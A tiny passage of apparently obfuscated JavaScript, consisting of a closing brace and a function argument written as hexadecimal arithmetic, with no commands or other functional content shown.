}, 0xb8 + 0x9 * 0x36a + -0xf * 0x212);